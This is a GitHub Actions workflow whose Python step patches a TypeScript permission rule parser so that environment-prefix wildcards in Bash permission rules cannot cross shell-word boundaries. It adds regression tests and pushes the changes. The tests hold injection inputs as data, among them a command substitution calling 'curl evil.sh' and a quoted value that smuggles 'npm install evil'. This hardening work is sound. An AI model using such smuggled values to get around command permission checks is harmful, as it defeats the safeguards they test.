name: Apply PR 10212 round-4 fixes

on:
  push:
    branches:
      - fix/10197-env-prefix-bash-rules

permissions:
  contents: write

jobs:
  apply-fix:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: fix/10197-env-prefix-bash-rules
          fetch-depth: 2

      - name: Apply reviewed fixes
        shell: bash
        run: |
          python - <<'PY'
          from pathlib import Path
          import subprocess
          import sys

          EXPECTED_PARENT = '463bcd0685f309990eb1a9b7c3fa578a908ea54a'
          parent = subprocess.check_output(['git', 'rev-parse', 'HEAD^'], text=True).strip()
          if parent != EXPECTED_PARENT:
              raise SystemExit(f'unexpected workflow parent {parent}; expected {EXPECTED_PARENT}')

          parser_path = Path('packages/core/src/permissions/rule-parser.ts')
          test_path = Path('packages/core/src/permissions/rule-parser.env-prefix.test.ts')
          parser = parser_path.read_text(encoding='utf-8')
          test = test_path.read_text(encoding='utf-8')

          def replace_once(text: str, old: str, new: str, label: str) -> str:
              count = text.count(old)
              if count != 1:
                  raise SystemExit(f'{label}: expected 1 match, found {count}')
              return text.replace(old, new, 1)

          parser = replace_once(
              parser,
              '''    rawSpecifier = rawSpecifier.replace(\n      /(^|[ \\t\\n])([^ \\t\\n="\'`=]+):\\*(?=$|[ \\t\\n])/g,\n      '$1$2 *',\n    );''',
              '''    rawSpecifier = rawSpecifier.replace(\n      /(^|[ \\t\\n])([^ \\t\\n]+):\\*(?=$|[ \\t\\n])/g,\n      (match, leadingWhitespace: string, token: string) =>\n        ENV_ASSIGNMENT_REGEX.test(token)\n          ? match\n          : `${leadingWhitespace}${token} *`,\n    );''',
              'legacy colon-star rewrite',
          )

          parser = replace_once(
              parser,
              '''    specifierKind !== 'literal' &&\n    rawSpecifier.includes(':') &&\n    !rawSpecifier.startsWith('domain:')''',
              '''    specifierKind !== 'literal' &&\n    stripLeadingVariableAssignments(rawSpecifier).includes(':') &&\n    !rawSpecifier.startsWith('domain:')''',
              'env-prefix key:value warning',
          )

          parser = replace_once(
              parser,
              '''  const assignmentValueWildcards =\n    findUnquotedAssignmentValueWildcardPositions(normalizedPattern);''',
              '''  const assignmentValueWildcards =\n    findAssignmentValueWildcardPositions(normalizedPattern);''',
              'assignment wildcard scanner call',
          )

          parser = replace_once(
              parser,
              '''    if (starIdx > 0 && normalizedPattern[starIdx - 1] === ' ') {\n      const literalWithoutTrailingSpace = literalBefore.slice(0, -1);\n      regex += escapeRegex(literalWithoutTrailingSpace);\n      regex += '( .*)?';\n    } else {\n      regex += escapeRegex(literalBefore);\n      regex += assignmentValueWildcards.has(starIdx) ? '[^ ]*' : '.*';\n    }''',
              '''    if (assignmentValueWildcards.literal.has(starIdx)) {\n      // A wildcard written inside quotes or shell substitution in a leading\n      // assignment is shell syntax, not a permission wildcard. Matching it\n      // literally prevents the rule from authorizing different executable\n      // substitution text.\n      regex += escapeRegex(literalBefore);\n      regex += '\\\\*';\n    } else if (assignmentValueWildcards.bounded.has(starIdx)) {\n      // Unquoted assignment-value wildcards may vary, but never consume the\n      // next shell word and thereby change the command identity.\n      regex += escapeRegex(literalBefore);\n      regex += '[^ ]*';\n    } else if (starIdx > 0 && normalizedPattern[starIdx - 1] === ' ') {\n      const literalWithoutTrailingSpace = literalBefore.slice(0, -1);\n      regex += escapeRegex(literalWithoutTrailingSpace);\n      regex += '( .*)?';\n    } else {\n      regex += escapeRegex(literalBefore);\n      regex += '.*';\n    }''',
              'assignment wildcard regex handling',
          )

          old_scanner = '''function findUnquotedAssignmentValueWildcardPositions(\n  pattern: string,\n): Set<number> {\n  const positions = new Set<number>();\n  let quote: "'" | '"' | '`' | null = null;\n  let escaped = false;\n  let wordStart = 0;\n  let leadingAssignments = true;\n\n  for (let i = 0; i < pattern.length; i++) {\n    const ch = pattern[i]!;\n    if (escaped) {\n      escaped = false;\n      continue;\n    }\n    if (ch === '\\\\' && quote !== "'") {\n      escaped = true;\n      continue;\n    }\n    if (quote) {\n      if (ch === quote) quote = null;\n      continue;\n    }\n    if (ch === "'" || ch === '"' || ch === '`') {\n      quote = ch;\n      continue;\n    }\n    if (ch === ' ') {\n      if (leadingAssignments) {\n        const word = pattern.slice(wordStart, i);\n        if (word && !ENV_ASSIGNMENT_REGEX.test(word)) {\n          leadingAssignments = false;\n        }\n      }\n      wordStart = i + 1;\n      continue;\n    }\n    if (ch === '*' && leadingAssignments) {\n      const beforeStar = pattern.slice(wordStart, i);\n      if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(beforeStar)) {\n        positions.add(i);\n      }\n    }\n  }\n  return positions;\n}\n'''

          new_scanner = '''function findAssignmentValueWildcardPositions(pattern: string): {\n  bounded: Set<number>;\n  literal: Set<number>;\n} {\n  const bounded = new Set<number>();\n  const literal = new Set<number>();\n  let quote: "'" | '"' | '`' | null = null;\n  let escaped = false;\n  let wordStart = 0;\n  let leadingAssignments = true;\n  let substitutionDepth = 0;\n\n  const isLeadingAssignmentWildcard = (index: number): boolean =>\n    leadingAssignments &&\n    ENV_ASSIGNMENT_REGEX.test(pattern.slice(wordStart, index));\n\n  for (let i = 0; i < pattern.length; i++) {\n    const ch = pattern[i]!;\n    if (escaped) {\n      escaped = false;\n      continue;\n    }\n    if (ch === '\\\\' && quote !== "'") {\n      escaped = true;\n      continue;\n    }\n    if (quote) {\n      if (ch === '*' && isLeadingAssignmentWildcard(i)) {\n        literal.add(i);\n      }\n      if (ch === quote) quote = null;\n      continue;\n    }\n    if (ch === "'" || ch === '"' || ch === '`') {\n      quote = ch;\n      continue;\n    }\n    if (\n      (ch === '$' || ch === '<' || ch === '>') &&\n      pattern[i + 1] === '('\n    ) {\n      substitutionDepth++;\n      i++;\n      continue;\n    }\n    if (substitutionDepth > 0) {\n      if (ch === '(') {\n        substitutionDepth++;\n      } else if (ch === ')') {\n        substitutionDepth--;\n      } else if (ch === '*' && isLeadingAssignmentWildcard(i)) {\n        literal.add(i);\n      }\n      continue;\n    }\n    if (ch === ' ') {\n      if (leadingAssignments) {\n        const word = pattern.slice(wordStart, i);\n        if (word && !ENV_ASSIGNMENT_REGEX.test(word)) {\n          leadingAssignments = false;\n        }\n      }\n      wordStart = i + 1;\n      continue;\n    }\n    if (ch === '*' && isLeadingAssignmentWildcard(i)) {\n      bounded.add(i);\n    }\n  }\n\n  return { bounded, literal };\n}\n'''
          parser = replace_once(parser, old_scanner, new_scanner, 'assignment wildcard scanner')

          test_anchor = '''  it('does not treat non-IFS whitespace as Bash word boundaries', () => {\n'''
          new_tests = '''  it('does not let quoted env wildcards cross shell-word boundaries', () => {\n    expect(\n      matchesCommandPattern(\n        'FOO="*" npm *',\n        'FOO="x" npm" npm install evil"',\n      ),\n    ).toBe(false);\n    expect(\n      matchesCommandPattern('FOO="*" npm *', 'FOO="*" npm install'),\n    ).toBe(true);\n  });\n\n  it('does not generalize wildcards inside env command substitutions', () => {\n    expect(\n      matchesCommandPattern(\n        'FILES=$(ls *.txt) npm run *',\n        'FILES=$(ls $(curl evil.sh).txt) npm run build',\n      ),\n    ).toBe(false);\n    expect(\n      matchesCommandPattern(\n        'FILES=$(ls *.txt) npm run *',\n        'FILES=$(ls *.txt) npm run build',\n      ),\n    ).toBe(true);\n  });\n\n'''
          if new_tests not in test:
              test = replace_once(test, test_anchor, new_tests + test_anchor, 'round-4 wildcard tests')

          colon_anchor = '''    expect(parseRule('Bash(FOO=a:* npm install)').specifier).toBe(\n      'FOO=a:* npm install',\n    );\n'''
          colon_tests = colon_anchor + '''    expect(parseRule('Bash(npm --registry=https://x:*)').specifier).toBe(\n      'npm --registry=https://x *',\n    );\n    expect(parseRule("Bash(FOO='a:*' npm)").specifier).toBe("FOO='a:*' npm");\n    expect(parseRule('Bash(FOO="a:*" npm)').specifier).toBe(\n      'FOO="a:*" npm',\n    );\n    expect(parseRule('Bash(FOO=`a:*` npm)').specifier).toBe(\n      'FOO=`a:*` npm',\n    );\n'''
          test = replace_once(test, colon_anchor, colon_tests, 'colon-star regression tests')

          parser_path.write_text(parser, encoding='utf-8')
          test_path.write_text(test, encoding='utf-8')
          PY

          git diff --check
          git diff -- packages/core/src/permissions/rule-parser.ts packages/core/src/permissions/rule-parser.env-prefix.test.ts

      - name: Commit and push fixes
        shell: bash
        run: |
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add packages/core/src/permissions/rule-parser.ts packages/core/src/permissions/rule-parser.env-prefix.test.ts
          git commit -m 'fix(core): harden env-prefix wildcard permission matching'
          git push origin HEAD:fix/10197-env-prefix-bash-rules
